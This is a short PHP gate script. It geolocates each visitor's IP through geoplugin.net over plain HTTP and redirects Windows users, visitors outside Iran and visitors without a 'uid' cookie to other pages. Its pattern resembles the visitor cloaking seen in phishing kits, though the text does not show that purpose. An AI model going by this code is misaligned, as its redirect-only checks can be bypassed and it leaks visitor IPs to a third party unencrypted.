<?php
require_once('func.php');

$ip = $_SERVER['REMOTE_ADDR'];

$ipdat = @json_decode(file_get_contents(
    "http://www.geoplugin.net/json.gp?ip=" . $ip
));

$country = $ipdat->geoplugin_countryName;
$city = $ipdat->geoplugin_city;
$continent = $ipdat->geoplugin_continentName;
$latitude = $ipdat->geoplugin_latitude;
$longitude = $ipdat->geoplugin_longitude;
$countryCode = $ipdat->geoplugin_countryCode;


if (strpos($_SERVER['HTTP_USER_AGENT'], 'Windows')) {
    echo '<script>window.location.assign("device.php")</script>';
    $security = true;
}

if ($countryCode != "IR") {
    echo '<script>window.location.assign("block.php")</script>';
}

if (isset($_COOKIE['uid'])) {
    $security = true;
} else {
    echo '<script>window.location.assign("splash.php")</script>';
    $security = false;
}
